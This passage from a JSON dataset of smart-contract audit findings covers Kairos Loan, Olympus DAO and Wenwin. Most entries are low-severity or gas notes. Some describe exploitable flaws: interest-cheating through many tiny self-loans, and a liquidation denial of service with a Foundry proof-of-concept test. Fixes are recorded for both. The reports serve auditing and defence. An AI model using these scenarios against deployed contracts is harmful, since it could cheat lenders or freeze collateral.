      "summary": "\nThis bug report was found by 0x52 and GimelSec and relates to the issue of an adversary utilizing a large number of their own loans to cheat other lenders out of interest. This bug was found in the ClaimFacet.sol file, specifically lines 94-106. If a loan is paid back before the minimal interest rate has been reached then each provision will receive the unweighted minimal interest amount, allowing the adversary to pay legitimate lenders a lower APR than expected. \n\nAn example of this is if a user wishes to borrow 1000 USDC at 10% APR, but creates an offer for themselves and borrows 20 USDC from it 9 times. This creates a total of 10 provisions each owed a minimum of 10 USDC or 100 USDC total. After 1 year they owe 100 USDC on their loan and the repay the loan. Since 100 USDC is the minimum, each of the 10 provisions will get their minimal interest. 90 USDC will go to their provisions and 10 will go to the legitimate user who loaned them a majority of the USDC. Their APR is ~1.2% which is ~1/9th of what they specified.\n\nThe impact of this bug is that legitimate users can be cheated out of interest owed. The recommendation is to enforce the relative size of the provisions so that one is not much larger than any other one. This bug was fixed by restricting the number of offers/provisions per loan to 1, eliminating the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/24",
      "tags": [],
      "finders": [
        "0x52",
        "GimelSec"
      ]
    },
    {
      "id": "12279",
      "title": "M-2: useLoan doesn't allow liqudator to specifiy maximum price",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/25 \n\n## Found by \n0x52\n\n## Summary\n\nuseLoan doesn't allow the liquidator to specify a max price they are will to pay for the collateral they are liquidating. On the surface this doesn't seem like an issue because the price is always decreasing due to the dutch auction. However this can be problematic if the chain the contracts are deployed suffers a reorg attack. This can place the transaction earlier than anticipated and therefore charge the user more than they meant to pay. On Ethereum this is unlikely but this is meant to be deployed on any compatible EVM chain many of which are frequently reorganized.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nLiquidator can be charged more than intended\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L59-L73\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow liquidator to specify a max acceptable price to pay\n\n\n\n## Discussion\n\n**npasquie**\n\nfixed here https://github.com/kairos-loan/kairos-contracts/pull/50",
      "summary": "\nThis bug report is about the useLoan feature in the kairos-contracts repository not allowing the liquidator to specify a maximum price they are willing to pay for the collateral they are liquidating. This can be problematic if the chain the contracts are deployed on suffers a reorg attack, which can place the transaction earlier than anticipated and therefore charge the user more than they meant to pay. On Ethereum this is unlikely, but this is meant to be deployed on any compatible EVM chain, many of which are frequently reorganized. It was found manually and the code snippet can be found at the given link. The recommendation is to allow liquidator to specify a max acceptable price to pay. The bug was fixed in a pull request.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/25",
      "tags": [
        "Chain Reorganization Attack"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "12278",
      "title": "M-1: Denial-of-Service in the liquidation flow results in the collateral NTF will be stuck in the contract.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/76 \n\n## Found by \nInspex, jekapi\n\n\n## Summary\nIf the `loanTovalue` value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever.\n\n\n## Vulnerability Detail\nThe platform allows users to sign offers and provide funds to those who need to borrow assets.\n\nIn the first scenario, the lender provided an offer that the `loanTovalue` as high as the result of the `shareMatched` is `0`. For example, if the borrowed amount was `1e40` and the offer had a `loanTovalue` equal to `1e68`, the share would be `0`.\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/BorrowLogic/BorrowHandlers.sol#L47\n\nAs a result, an arithmetic error (`Division or modulo by 0`) will occur in the `price()` function at line 50 during the liquidation process.\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L34-L55\n\nIn the second scenario, if the lender's share exceeds `0`, but the offer's `loanToValue` is extremely high, the `price()` function at line 54 may encounter an arithmetic error(`Arithmetic over/underflow`) during the `estimatedValue` calculation.\n\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L54\n\n## Poof of Concept\n**kairos-contracts/test/BorrowBorrow.t.sol**\n```solidity\nfunction testBorrowOverflow() public {\n    uint256 borrowAmount = 1e40;\n    BorrowArg[] memory borrowArgs = new BorrowArg[](1);\n    (, ,uint256 loanId , ) = kairos.getParameters();\n    loanId += 1;\n\n    Offer memory offer = Offer({\n            assetToLend: money,\n            loanToValue: 1e61,\n            duration: 1,\n            expirationDate: block.timestamp + 2 hours,\n            tranche: 0,\n            collateral: getNft()\n        });\n    uint256 currentTokenId;\n\n    getFlooz(signer, money, getOfferArg(offer).amount);\n\n    {\n        OfferArg[] memory offerArgs = new OfferArg[](1);\n        currentTokenId = getJpeg(BORROWER, nft);\n        offer.collateral.id = currentTokenId;\n        offerArgs[0] = OfferArg({\n            signature: getSignature(offer),\n            amount: borrowAmount,\n            offer: offer\n        });\n        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});\n    }\n\n    vm.prank(BORROWER);\n    kairos.borrow(borrowArgs);\n\n    assertEq(nft.balanceOf(BORROWER), 0);\n    assertEq(money.balanceOf(BORROWER), borrowAmount);\n    assertEq(nft.balanceOf(address(kairos)), 1);\n\n    vm.warp(block.timestamp + 1);\n    Loan memory loan = kairos.getLoan(loanId);\n    console.log(\"price of loanId\", kairos.price(loanId));\n}\n```\n\n\n\n## Impact\nThe loan position will not be liquidated, which will result in the collateral NTF being permanently frozen in the contract.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/BorrowLogic/BorrowHandlers.sol#L47\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L50\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L54\n## Tool used\n\nManual Review\n\n## Recommendation\nWe recommend adding the mechanism during the borrowing process to restrict the maximum `loanToValue` limit and ensure that the lender's share is always greater than zero. This will prevent arithmetic errors.\n\n\n\n## Discussion\n\n**npasquie**\n\nsimilar to #34 \n\n**npasquie**\n\nfixed here https://github.com/kairos-loan/kairos-contracts/pull/52",
      "summary": "\nThis bug report discusses a denial-of-service vulnerability in the liquidation flow of the Kairos platform. If the loanTovalue value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever. This can happen in two scenarios: when the lender provides an offer that the loanTovalue is equal to the result of the shareMatched is 0, or when the lender's share exceeds 0 but the offer's loanToValue is extremely high. If this happens, the loan position will not be liquidated, resulting in the collateral NTF being permanently frozen in the contract. Manual review and the Poof of Concept code snippet were used to identify the vulnerability. The bug was fixed by adding a mechanism during the borrowing process to restrict the maximum loanToValue limit and ensure that the lender's share is always greater than zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/76",
      "tags": [
        "DOS",
        "Denial-Of-Service"
      ],
      "finders": [
        "Inspex",
        "jekapi"
      ]
    },
    {
      "id": "48247",
      "title": "Missing Initialization Check",
      "impact": "LOW",
      "content": "## CrossChainBridge.sol Analysis\n\n## Function Overview\n\n```solidity\nfunction isTrustedRemote(uint16 srcChainId_, bytes calldata srcAddress_)\nexternal\nview\nreturns (bool)\n{\n    bytes memory trustedSource = trustedRemoteLookup[srcChainId_];\n    return (srcAddress_.length == trustedSource.length &&\n            keccak256(srcAddress_) == keccak256(trustedSource));\n}\n```\n\n## Issue Description\n\nThe function fails to verify whether `srcAddress_` is initialized. Consequently, a function call with a currently uninitialized source chain ID and an empty source address would return `true`, contrary to expectations.\n\n## Remediation\n\nAdd an initialization check to `isTrustedRemote`.\n\n## Patch\n\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48246",
      "title": "Gas Optimization",
      "impact": "LOW",
      "content": "## Olympus DAO OFT Audit 05 | General Findings\n\n## CrossChainBridge.sol - Permissions Management\n\n```solidity\npermissions[1] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\npermissions[2] = Permissions(MINTR_KEYCODE, MINTR.increaseMintApproval.selector);\npermissions[3] = Permissions(MINTR_KEYCODE, MINTR.decreaseMintApproval.selector);\n```\n\nThe `MINTR.decreaseMintApproval` permission is not being used anywhere, therefore it is unnecessary to request it.\n\n### Remediation\nRemove the code that requests the `MINTR.decreaseMintApproval` permission.\n\n---\n\n## CrossChainBridge.sol - Trusted Remote Address\n\n```solidity\nfunction getTrustedRemoteAddress(uint16 remoteChainId_) external view returns (bytes memory) {\n    bytes memory path = trustedRemoteLookup[remoteChainId_];\n    if (path.length == 0) revert Bridge_NoTrustedPath();\n    // The last 20 bytes should be address(this)\n    return path.slice(0, path.length - 20);\n}\n```\n\nIf `path.length` equals zero, the expression `path.length - 20` will be reverted, rendering the length check unnecessary unless it is needed to explain an error in case `path.length` is zero.\n\n### Remediation\nRemove the length check.\n\n---\n\n## CrossChainBridge.sol - Fee Estimation\n\n```solidity\nbytes calldata adapterParams_) external view returns (uint256 nativeFee, uint256 zroFee) {\n    // Mock the payload for sendOhm()\n    bytes memory payload = abi.encode(to_, amount_);\n    return lzEndpoint.estimateFees(dstChainId_, address(this), payload, false, adapterParams_);\n}\n```\n\n```solidity\n_sendMessage(dstChainId_, payload, payable(msg.sender), address(0x0), bytes(\"\"), msg.value);\n```\n\nIn the `estimateSendFee()` function, `adapterParams_` is not needed as it is always set to `bytes(\"\")` when using `_sendMessage()` to transfer OHM tokens.\n\n### Remediation\nRemove the `adapterParams_` parameter and replace it with `bytes(\"\")`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48245",
      "title": "Remove Dead Code",
      "impact": "LOW",
      "content": "## Internal Functions Analysis\n\nThese two internal functions are not used within the contract.\n\n## File Reference\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n### Functions\n- **Function:** `_checkGasLimit()`\n- **Function:** `_getGasLimit(bytes memory adapterParams_)`\n\nSimilarly, `setMinDstGas()` is designed to determine the minimum amount of gas required to verify the gas limit. However, since `_checkGasLimit` is not being used, both the function and the related storage are unnecessary.\n\n## Storage\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n```solidity\nmapping(uint16 => mapping(uint16 => uint256)) public minDstGasLookup;\n```\n\n- **Function:** `setMinDstGas()`\n\nThis constant is also not used anywhere.\n\n## Constant\n**File:** `src/policies/CrossChainBridge.sol`  \n**Language:** Solidity\n\n```solidity\n/// @notice LZ endpoint packet type\nuint16 public constant PT_SEND = 0;\n```\n\n## Remediation\nRemove unnecessary contract code.\n\n## Patch\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48244",
      "title": "Ambiguous Offchain Counter Design",
      "impact": "LOW",
      "content": "## Cross Chain Bridge Solidity Policy Review\n\n## Code Snippet\n```solidity\nif (counterEnabled) offchainOhmCounter -= amount;\nMINTR.increaseMintApproval(address(this), amount);\nMINTR.mintOhm(to, amount);\n```\n\n## Safety Considerations\nThe `counterEnabled` feature is only safe if:\n\n1. OHM is only minted outside of `CrossChainBridge` on exactly one chain, presumably mainnet.\n2. The counter is only enabled on that chain.\n\nOtherwise, unaccounted-for OHM could underflow the counter, making it impossible to recover bridged OHM.\n\n## Remediation\nCurrently, the comment is ambiguous. Consider explicitly documenting this behaviour.\n\n```solidity\n/// @notice Flag for if offchain OHM counter is enabled or not\nbool public counterEnabled; // NOTE: Currently only used on mainnet\n```\n\n## Patch\nFixed in #120.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "48243",
      "title": "Invalid Message Replay Design",
      "impact": "HIGH",
      "content": "## Replay Messages and Access Control Issues\n\nWhen messages are replayed, there’s a direct internal call to `_receiveMessage`.\n\n### Source Code Reference\n`src/policies/CrossChainBridge.sol` (SOLIDITY)\n\n```solidity\n// Execute the message. revert if it fails again\n_receiveMessage(srcChainId_, srcAddress_, nonce_, payload_);\nemit RetryMessageSuccess(srcChainId_, srcAddress_, nonce_, payloadHash);\n```\n\nHowever, this code performs an access control check on the sender, which will cause the invocation to abort.\n\n### Source Code Reference\n`src/policies/CrossChainBridge.sol` (SOLIDITY)\n\n```solidity\n// Needed to restrict access to low-level call from lzReceive\nif (msg.sender != address(this)) revert Bridge_InvalidCaller();\n```\n\nAs a result, the replay feature does not work. Messages that failed the initial invocation would lead to permanently locking up OHM tokens in the contract.\n\n## Remediation\n\nConsider mirroring the LayerZero endpoint, which performs an external call to properly set `msg.sender`.\n\n### Source Code Reference\n`Endpoint.sol` (SOLIDITY)\n\n```solidity\nILayerZeroReceiver(dstAddress).lzReceive(_srcChainId, _srcAddress, nonce, _payload);\nemit PayloadCleared(_srcChainId, _srcAddress, nonce, dstAddress);\n```\n\n## Patch\n\nFixed in #120.",
      "summary": "\nThis bug report discusses a problem with a feature called \"replay\" in the CrossChainBridge smart contract. When this feature is used, there is a direct internal call to a function called _receiveMessage. However, there is a code error that causes an access control check to fail, which means that the feature does not work properly. This can result in the contract becoming permanently locked and causing issues with OHM tokens. The suggested solution is to mirror a different endpoint that will properly set the sender address. This issue has been fixed in a recent update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OtterSec",
      "protocol_name": "Olympus DAO",
      "source_link": "https://www.olympusdao.finance/",
      "github_link": "https://github.com/OlympusDAO/bophades/tree/xchain/",
      "tags": [],
      "finders": [
        "Youngjoo Lee",
        "Robert Chen",
        "OtterSec"
      ]
    },
    {
      "id": "23262",
      "title": "[N-08] First win tier is always empty in `packFixedRewards`",
      "impact": "LOW",
      "content": "\nThe rewards for the first win tier (tier 0) are always 0, meaning the lowest 16 bits of the packed rewards word are always 0 wasting this space. Consider offsetting the tier by 1 (store tier 1 in lowest 16 bits, tier 2 in next 16 bits, and so on) to take advantage of this space. This change also allows the protocol to support a max selection size of 17 instead of 16.\n\n## Formal Verification\n\n### Validity of reconstructed tickets\n\nThe following Certora rule proves that reconstructed tickets from a random source are valid within the accepted range of `selectionSize` and `selectionMax` parameters.\n\nResults: https://prover.certora.com/output/78195/0f1385d89b704d8cbe588829e162028c?anonymousKey=3f8b6d024580c29b4a4eb11e6efc776cb8e45615\n\n```\nmethods {\n  isValidTicket(uint256,uint8,uint8) returns (bool) envfree\n  reconstructTicket(uint256,uint8,uint8) returns (uint120) envfree\n}\n\nrule reconstructedTicketIsValid() {\n  uint256 random;\n  uint8 selectionSize;\n  uint8 selectionMax;\n\n  require selectionMax <= 120;\n  require selectionSize <= 16 || selectionSize <= (selectionMax -1);\n\n  uint256 ticket = reconstructTicket(random, selectionSize, selectionMax);\n\n  assert isValidTicket(ticket, selectionSize, selectionMax), \"reconstructed ticket is not valid\";\n}\n```\n\n**[0xluckydev (Wenwin) confirmed and commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/443#issuecomment-1467797135):**\n > High quality report.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/443#issuecomment-1478916482):**\n > The Low Risk issues also includes downgraded findings [#486](https://github.com/code-423n4/2023-03-wenwin-findings/issues/486), [#431](https://github.com/code-423n4/2023-03-wenwin-findings/issues/431), [#428](https://github.com/code-423n4/2023-03-wenwin-findings/issues/428), [#423](https://github.com/code-423n4/2023-03-wenwin-findings/issues/423), and [#413](https://github.com/code-423n4/2023-03-wenwin-findings/issues/413).\n> \n> In addition, L-04 (Missing event for important parameter change) would be considered an INFO because although event issues would be considered as non-critical, I consider that privileged functions that do not emit events should be considered as INFO. (*see [original comment](https://github.com/code-423n4/2023-03-wenwin-findings/issues/443#issuecomment-1478916482) for full details*)\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23261",
      "title": "[N-07] Simplify unpacking expression in `fixedReward`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-03-wenwin/blob/main/src/LotterySetup.sol#L126-L127\n\nThe following calculation:\n\n```solidity\nuint256 mask = uint256(type(uint16).max) << (winTier * 16);\nuint256 extracted = (nonJackpotFixedRewards & mask) >> (winTier * 16);\n```\n\nCan be simplified using a single shift as:\n\n```solidity\nuint256 extracted = (nonJackpotFixedRewards >> (winTier * 16)) & type(uint16).max;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23260",
      "title": "[N-06] Contract files should define a locked compiler version",
      "impact": "LOW",
      "content": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\n*Instances (2)*:\n```solidity\nFile: src/VRFv2RNSource.sol\n\n3: pragma solidity ^0.8.7;\n\n```\n\n```solidity\nFile: src/staking/StakedTokenLock.sol\n\n3: pragma solidity ^0.8.17;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23259",
      "title": "[N-05] Use a modifier for access control",
      "impact": "LOW",
      "content": "\nConsider using a modifier to implement access control instead of inlining the condition/requirement in the function's body.\n\nhttps://github.com/code-423n4/2023-03-wenwin/blob/main/src/RNSourceController.sol#L46-L49\n\n```solidity\nfunction onRandomNumberFulfilled(uint256 randomNumber) external override {\n    if (msg.sender != address(source)) {\n        revert RandomNumberFulfillmentUnauthorized();\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23258",
      "title": "[N-04] Unused local variables",
      "impact": "LOW",
      "content": "\nUnused variables should be removed.\n\n```solidity\nFile: src/Lottery.sol\n\n260:    uint256 winTier;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23257",
      "title": "[N-03] Refactor common code across functions",
      "impact": "LOW",
      "content": "\n`claimRewards` and `unclaimedRewards` functions in the `Lottery` contract have a lot of duplicate functionality. Consider refactoring common code in a private function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23256",
      "title": "[N-02] Use named parameters for mapping type declarations",
      "impact": "LOW",
      "content": "Consider using named parameters in mappings (e.g. `mapping(address account => uint256 balance)`) to improve readability. This feature is present since Solidity 0.8.18.\n\n*Instances (17)*:\n```solidity\nFile: src/Lottery.sol\n\n26:     mapping(address => uint256) private frontendDueTicketSales;\n\n27:     mapping(uint128 => mapping(uint120 => uint256)) private unclaimedCount;\n\n27:     mapping(uint128 => mapping(uint120 => uint256)) private unclaimedCount;\n\n36:     mapping(uint128 => uint120) public override winningTicket;\n\n37:     mapping(uint128 => mapping(uint8 => uint256)) public override winAmount;\n\n37:     mapping(uint128 => mapping(uint8 => uint256)) public override winAmount;\n\n39:     mapping(uint128 => uint256) public override ticketsSold;\n\n```\n\n```solidity\nFile: src/RNSourceBase.sol\n\n9:     mapping(uint256 => RandomnessRequest) internal requests;\n\n```\n\n```solidity\nFile: src/ReferralSystem.sol\n\n17:     mapping(uint128 => mapping(address => UnclaimedTicketsData)) public override unclaimedTickets;\n\n17:     mapping(uint128 => mapping(address => UnclaimedTicketsData)) public override unclaimedTickets;\n\n19:     mapping(uint128 => uint256) public override totalTicketsForReferrersPerDraw;\n\n21:     mapping(uint128 => uint256) public override referrerRewardPerDrawForOneTicket;\n\n23:     mapping(uint128 => uint256) public override playerRewardsPerDrawForOneTicket;\n\n25:     mapping(uint128 => uint256) public override minimumEligibleReferrals;\n\n```\n\n```solidity\nFile: src/Ticket.sol\n\n14:     mapping(uint256 => ITicket.TicketInfo) public override ticketsInfo;\n\n```\n\n```solidity\nFile: src/staking/Staking.sol\n\n19:     mapping(address => uint256) public override userRewardPerTokenPaid;\n\n20:     mapping(address => uint256) public override rewards;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23255",
      "title": "[N-01] Import declarations should import specific symbols",
      "impact": "LOW",
      "content": "\nPrefer import declarations that specify the symbol(s) using the form `import {SYMBOL} from \"SomeContract.sol\"` rather than importing the whole file.\n\n*Instances (53)*:\n```solidity\nFile: src/Lottery.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n6: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n7: import \"src/ReferralSystem.sol\";\n\n8: import \"src/RNSourceController.sol\";\n\n9: import \"src/staking/Staking.sol\";\n\n10: import \"src/LotterySetup.sol\";\n\n11: import \"src/TicketUtils.sol\";\n\n```\n\n```solidity\nFile: src/LotteryMath.sol\n\n5: import \"src/interfaces/ILottery.sol\";\n\n6: import \"src/PercentageMath.sol\";\n\n```\n\n```solidity\nFile: src/LotterySetup.sol\n\n5: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\n\n7: import \"src/PercentageMath.sol\";\n\n8: import \"src/LotteryToken.sol\";\n\n9: import \"src/interfaces/ILotterySetup.sol\";\n\n10: import \"src/Ticket.sol\";\n\n```\n\n```solidity\nFile: src/LotteryToken.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n6: import \"src/interfaces/ILotteryToken.sol\";\n\n7: import \"src/LotteryMath.sol\";\n\n```\n\n```solidity\nFile: src/RNSourceBase.sol\n\n5: import \"src/interfaces/IRNSource.sol\";\n\n```\n\n```solidity\nFile: src/RNSourceController.sol\n\n5: import \"@openzeppelin/contracts/access/Ownable2Step.sol\";\n\n6: import \"src/interfaces/IRNSource.sol\";\n\n7: import \"src/interfaces/IRNSourceController.sol\";\n\n```\n\n```solidity\nFile: src/ReferralSystem.sol\n\n5: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n6: import \"src/interfaces/IReferralSystem.sol\";\n\n7: import \"src/PercentageMath.sol\";\n\n```\n\n```solidity\nFile: src/Ticket.sol\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n6: import \"src/interfaces/ITicket.sol\";\n\n```\n\n```solidity\nFile: src/VRFv2RNSource.sol\n\n5: import \"@chainlink/contracts/src/v0.8/VRFV2WrapperConsumerBase.sol\";\n\n6: import \"src/interfaces/IVRFv2RNSource.sol\";\n\n7: import \"src/RNSourceBase.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/ILottery.sol\n\n5: import \"src/interfaces/ILotterySetup.sol\";\n\n6: import \"src/interfaces/IRNSourceController.sol\";\n\n7: import \"src/interfaces/ITicket.sol\";\n\n8: import \"src/interfaces/IReferralSystem.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/ILotterySetup.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6: import \"src/interfaces/ITicket.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/ILotteryToken.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/IRNSourceController.sol\n\n5: import \"@openzeppelin/contracts/access/Ownable2Step.sol\";\n\n6: import \"src/interfaces/IRNSource.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/IReferralSystem.sol\n\n5: import \"src/interfaces/ILotteryToken.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/ITicket.sol\n\n5: import \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\n```\n\n```solidity\nFile: src/interfaces/IVRFv2RNSource.sol\n\n5: import \"src/interfaces/IRNSource.sol\";\n\n```\n\n```solidity\nFile: src/staking/StakedTokenLock.sol\n\n5: import \"@openzeppelin/contracts/access/Ownable2Step.sol\";\n\n6: import \"src/staking/interfaces/IStakedTokenLock.sol\";\n\n7: import \"src/staking/interfaces/IStaking.sol\";\n\n```\n\n```solidity\nFile: src/staking/Staking.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n7: import \"src/interfaces/ILottery.sol\";\n\n8: import \"src/LotteryMath.sol\";\n\n9: import \"src/staking/interfaces/IStaking.sol\";\n\n```\n\n```solidity\nFile: src/staking/interfaces/IStakedTokenLock.sol\n\n5: import \"src/staking/interfaces/IStaking.sol\";\n\n```\n\n```solidity\nFile: src/staking/interfaces/IStaking.sol\n\n5: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6: import \"src/interfaces/ILottery.sol\";\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "8931",
      "title": "[G-18] Use solidity version 0.8.19 to gain some gas boost",
      "impact": "GAS",
      "content": "\nUpgrade to the latest solidity version 0.8.19 to get additional gas savings.\n\nSee latest release for reference: https://blog.soliditylang.org/2023/02/22/solidity-0.8.19-release-announcement/\n\n### Proof Of Concept\n\n\n```solidity\npragma solidity ^0.8.7;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/VRFv2RNSource.sol#L3\n\n```solidity\npragma solidity ^0.8.7;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/interfaces/IVRFv2RNSource.sol#L3\n\n```solidity\npragma solidity ^0.8.17;\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/staking/StakedTokenLock.sol#L3\n\n**[rand0c0des (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/139#issuecomment-1467937790)**\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-18-use-solidity-version-0819-to-gain-some-gas-boost",
      "tags": [],
      "finders": []
    },
    {
      "id": "8930",
      "title": "[G-17] Unnecessary look up in `if` condition",
      "impact": "GAS",
      "content": "\nIf the `||` condition isn't required, the second condition will have been looked up unnecessarily.\n\n### Proof Of Concept\n\n```solidity\n95: if (notEnoughRetryInvocations || notEnoughTimeReachingMaxFailedAttempts) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/RNSourceController.sol#L95\n\n\n\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-17-unnecessary-look-up-in-if-condition",
      "tags": [],
      "finders": []
    },
    {
      "id": "8929",
